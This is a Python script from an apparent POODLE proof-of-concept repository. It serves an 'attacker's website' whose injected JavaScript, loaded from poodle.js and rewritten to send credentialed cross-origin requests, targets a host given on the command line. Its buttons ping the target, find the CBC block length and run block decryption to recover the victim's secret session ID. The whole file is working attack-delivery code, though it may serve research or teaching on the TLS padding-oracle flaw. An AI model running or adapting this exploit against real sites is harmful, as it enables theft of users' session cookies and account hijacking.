#!/usr/bin/python3

# A simple HTTP web server
# @author: RootDev4 (c) 09/2020
# @url: https://github.com/RootDev4/poodle-PoC

import sys
import http.server

try:
    import netifaces as ni
except:
    print('Missing module `netifaces`. Please install with `pip3 install netifaces`')
    sys.exit(1)

# HTML website
def getHtml():
    jsFile = open("poodle.js", "r")
    jsCode = jsFile.read()
    jsFile.close()

    jsCode = jsCode.replace("xhr.open(\"POST\", payload);",
        "xhr.open(\"POST\", url + payload);\nxhr.withCredentials = true;")

    html = """
    <!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>attacker.com</title>
            </head>
            <body>
                <h1>Attacker's website</h1>
                This website contains malicious JavaScript code, that generates  
                multiple requests to """ + sys.argv[1] + """ while sending the  
                secret session ID of """ + sys.argv[1] + """ inside each request.
                <p>
                    <button onclick="sendRequest()">Ping HTTPS Server</button>
                    <button onclick="findlengthblock()">Find CBC block length</button>
                    <button onclick="sendAttack()">Run block decryption</button>
                </p>
                <script type="text/javascript">
                    const url = '""" + sys.argv[1] + """';
                    function sendRequest() {
                        const xhr = new XMLHttpRequest()
                        xhr.onload = () => alert("HTTPS server is up and listening.")
                        xhr.open("GET", url)
                        xhr.withCredentials = true
                        xhr.send(null)
                    }
                    """ + jsCode + """
                </script>
            </body>
        </html>
    """

    return html

# Returns IP address of an interface
def getInterfaceIp(iface = "eth0"):
    ni.ifaddresses(iface)
    return ni.ifaddresses(iface)[ni.AF_INET][0]["addr"]

# Simple HTTP server
class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.do_GET()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(bytes(getHtml(), "utf-8"))

# Start
if __name__ == "__main__":
    if len(sys.argv) == 2:
        httpd = http.server.HTTPServer(("", 80), HTTPRequestHandler)
        print("Started simple HTTP server on http://{}/".format(getInterfaceIp("eth0")))
        print("Sending requests to", sys.argv[1])
        httpd.serve_forever()
    else:
        print("No target specified. Usage: python3 httpserver.py <fqdn_to_target>")
        print("Goodbye")
        sys.exit(1)
